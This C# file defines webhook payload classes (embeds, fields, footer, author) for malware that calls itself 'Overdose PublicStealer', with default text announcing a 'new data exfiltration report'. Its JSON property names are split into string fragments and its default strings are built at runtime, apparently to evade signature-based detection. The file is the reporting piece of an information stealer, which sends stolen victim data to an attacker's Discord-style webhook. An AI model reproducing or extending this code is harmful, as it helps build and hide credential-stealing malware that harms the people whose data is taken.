using System;
using System.Collections.Generic;
using System.Text.Json.Serialization;
using System.Text; // Todavía útil para BuildTitle, BuildDescription, etc., pero no para JsonPropertyName

namespace OdPS.Models
{
    // Definiciones de constantes para partes de nombres de propiedades JSON
    // Esto permite "construir" los nombres de las propiedades en tiempo de compilación.
    internal static class JsonPropertyNames
    {
        internal const string NamePart1 = "nam";
        internal const string NamePart2 = "e";
        internal const string ValuePart1 = "valu";
        internal const string ValuePart2 = "e";
        internal const string InlinePart1 = "inlin";
        internal const string InlinePart2 = "e";
        internal const string TextPart1 = "tex";
        internal const string TextPart2 = "t";
        internal const string IconUrlPart1 = "icon_ur";
        internal const string IconUrlPart2 = "l";
        internal const string UrlPart1 = "ur";
        internal const string UrlPart2 = "l";
        internal const string TitlePart1 = "titl";
        internal const string TitlePart2 = "e";
        internal const string DescriptionPart1 = "descriptio";
        internal const string DescriptionPart2 = "n";
        internal const string ColorPart1 = "colo";
        internal const string ColorPart2 = "r";
        internal const string FieldsPart1 = "fiel";
        internal const string FieldsPart2 = "ds";
        internal const string ImagePart1 = "imag";
        internal const string ImagePart2 = "e";
        internal const string FooterPart1 = "foote";
        internal const string FooterPart2 = "r";
        internal const string TimestampPart1 = "timestam";
        internal const string TimestampPart2 = "p";
        internal const string AuthorPart1 = "autho";
        internal const string AuthorPart2 = "r";
        internal const string ThumbnailPart1 = "thumbnai";
        internal const string ThumbnailPart2 = "l";
        internal const string UsernamePart1 = "usernam";
        internal const string UsernamePart2 = "e";
        internal const string AvatarUrlPart1 = "avatar_ur";
        internal const string AvatarUrlPart2 = "l";
        internal const string EmbedsPart1 = "embed";
        internal const string EmbedsPart2 = "s";
        internal const string ContentPart1 = "conten";
        internal const string ContentPart2 = "t";
        internal const string TtsPart1 = "tt";
        internal const string TtsPart2 = "s";
    }

    // Represents a field in the embed (for custom data)
    internal class EmbedField
    {
        [JsonPropertyName(JsonPropertyNames.NamePart1 + JsonPropertyNames.NamePart2)]
        public string Name { get; set; }

        [JsonPropertyName(JsonPropertyNames.ValuePart1 + JsonPropertyNames.ValuePart2)]
        public string Value { get; set; }

        [JsonPropertyName(JsonPropertyNames.InlinePart1 + JsonPropertyNames.InlinePart2)]
        public bool Inline { get; set; }
    }

    // Represents the footer section of the embed
    internal class EmbedFooter
    {
        [JsonPropertyName(JsonPropertyNames.TextPart1 + JsonPropertyNames.TextPart2)]
        public string Text { get; set; }

        [JsonPropertyName(JsonPropertyNames.IconUrlPart1 + JsonPropertyNames.IconUrlPart2)]
        public string IconUrl { get; set; }
    }

    // Represents an image inside the embed (optional)
    internal class EmbedImage
    {
        [JsonPropertyName(JsonPropertyNames.UrlPart1 + JsonPropertyNames.UrlPart2)]
        public string Url { get; set; }
    }

    // Represents the author section of the embed (optional)
    internal class EmbedAuthor
    {
        [JsonPropertyName(JsonPropertyNames.NamePart1 + JsonPropertyNames.NamePart2)]
        public string Name { get; set; }

        [JsonPropertyName(JsonPropertyNames.UrlPart1 + JsonPropertyNames.UrlPart2)]
        public string Url { get; set; }

        [JsonPropertyName(JsonPropertyNames.IconUrlPart1 + JsonPropertyNames.IconUrlPart2)]
        public string IconUrl { get; set; }
    }

    // Represents a thumbnail image for the embed (optional)
    internal class EmbedThumbnail
    {
        [JsonPropertyName(JsonPropertyNames.UrlPart1 + JsonPropertyNames.UrlPart2)]
        public string Url { get; set; }
    }

    // Represents the embed content
    internal class Embed
    {
        private string _title;
        [JsonPropertyName(JsonPropertyNames.TitlePart1 + JsonPropertyNames.TitlePart2)]
        public string Title
        {
            get => _title ?? BuildTitle();
            set => _title = value;
        }

        private string BuildTitle()
        {
            // Usamos StringBuilder para construir la cadena del título de forma dinámica
            return new StringBuilder()
                .Append("💊 ")
                .Append("New Overdose PublicStealer Report ")
                .Append("💊")
                .ToString();
        }

        private string _description;
        [JsonPropertyName(JsonPropertyNames.DescriptionPart1 + JsonPropertyNames.DescriptionPart2)]
        public string Description
        {
            get => _description ?? BuildDescription();
            set => _description = value;
        }

        private string BuildDescription()
        {
            // Usamos StringBuilder para construir la cadena de la descripción
            return new StringBuilder()
                .Append("A new data exfiltration report has been generated.")
                .ToString();
        }

        [JsonPropertyName(JsonPropertyNames.ColorPart1 + JsonPropertyNames.ColorPart2)]
        public int Color { get; set; }

        [JsonPropertyName(JsonPropertyNames.FieldsPart1 + JsonPropertyNames.FieldsPart2)]
        public List<EmbedField> Fields { get; set; } = new List<EmbedField>();

        [JsonPropertyName(JsonPropertyNames.ImagePart1 + JsonPropertyNames.ImagePart2)]
        public EmbedImage Image { get; set; }

        [JsonPropertyName(JsonPropertyNames.FooterPart1 + JsonPropertyNames.FooterPart2)]
        public EmbedFooter Footer { get; set; }

        [JsonPropertyName(JsonPropertyNames.TimestampPart1 + JsonPropertyNames.TimestampPart2)]
        public DateTimeOffset Timestamp { get; set; }

        [JsonPropertyName(JsonPropertyNames.AuthorPart1 + JsonPropertyNames.AuthorPart2)]
        public EmbedAuthor Author { get; set; }

        [JsonPropertyName(JsonPropertyNames.ThumbnailPart1 + JsonPropertyNames.ThumbnailPart2)]
        public EmbedThumbnail Thumbnail { get; set; }
    }

    // Represents the full webhook payload
    internal class WebhookPayload
    {
        private string _username;
        [JsonPropertyName(JsonPropertyNames.UsernamePart1 + JsonPropertyNames.UsernamePart2)]
        public string Username
        {
            get => _username ?? BuildUsername();
            set => _username = value;
        }

        private string BuildUsername()
        {
            // Usamos StringBuilder para construir el nombre de usuario
            return new StringBuilder()
                .Append("Overdose PublicStealer")
                .ToString();
        }

        // Modificado: DefaultAvatarUrl ahora se construye de forma dinámica
        public static string DefaultAvatarUrl => BuildDefaultAvatarUrl();

        private static string BuildDefaultAvatarUrl()
        {
            // Concatenamos partes de la URL para construirla
            return "https://i.pinimg.com/736x/56/a5/3c/" +
                   "56a53c0a581d8036e41f6de0656a869e.jpg";
        }

        // Modificado: DefaultEmbedImageUrl ahora se construye de forma dinámica
        public static string DefaultEmbedImageUrl => BuildDefaultEmbedImageUrl();

        private static string BuildDefaultEmbedImageUrl()
        {
            // Concatenamos partes de la URL para construirla
            return "https://i.pinimg.com/736x/11/f6/2c/" +
                   "11f62cf257786c26fcf190441808db12.jpg";
        }

        [JsonPropertyName(JsonPropertyNames.AvatarUrlPart1 + JsonPropertyNames.AvatarUrlPart2)]
        public string AvatarUrl { get; set; } = DefaultAvatarUrl;

        [JsonPropertyName(JsonPropertyNames.EmbedsPart1 + JsonPropertyNames.EmbedsPart2)]
        public List<Embed> Embeds { get; set; } = new List<Embed>();

        [JsonPropertyName(JsonPropertyNames.ContentPart1 + JsonPropertyNames.ContentPart2)]
        public string Content { get; set; }

        [JsonPropertyName(JsonPropertyNames.TtsPart1 + JsonPropertyNames.TtsPart2)]
        public bool Tts { get; set; }
    }
}
